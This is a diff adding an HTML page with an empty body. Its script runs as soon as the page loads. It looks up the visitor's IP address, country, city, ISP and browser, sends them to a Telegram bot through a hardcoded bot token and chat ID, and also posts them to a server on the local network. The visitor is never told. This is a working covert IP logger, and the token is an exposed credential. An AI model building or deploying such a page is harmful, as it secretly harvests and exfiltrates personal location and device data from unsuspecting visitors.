@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page</title>
+    <script>
+        // استبدل هذه القيم بمعلومات بوتك الخاص
+        const TELEGRAM_BOT_TOKEN = '7641723616:AAEROe8RdRoaKhAxbVv6lfUvQCURuCMBgbY';
+        const TELEGRAM_CHAT_ID = '7762891775';
+        
+        // دالة لإرسال الرسالة إلى تيليجرام
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Message sent to Telegram:', data);
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        // جمع المعلومات وإرسالها
+        fetch('http://ip-api.com/json')
+            .then(response => response.json())
+            .then(data => {
+                const message = `
+<b>New Visitor Information</b>
+IP: ${data.query}
+Country: ${data.country}
+Region: ${data.regionName}
+City: ${data.city}
+ISP: ${data.isp}
+Device: ${navigator.userAgent}
+                `;
+                
+                // إرسال المعلومات إلى تيليجرام
+                sendToTelegram(message);
+                
+                // يمكنك أيضاً إرسالها إلى السيرفر الخاص بك إذا أردت
+                fetch('http://192.168.137.1:5000/log_ip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ip: data.query,
+                        country: data.country,
+                        region: data.regionName,
+                        city: data.city,
+                        isp: data.isp
+                    })
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                sendToTelegram(`Error fetching visitor info: ${error.message}`);
+            });
+    </script>
+</head>
+<body>
+    <!-- محتوى الصفحة -->
+</body>
+  </html>
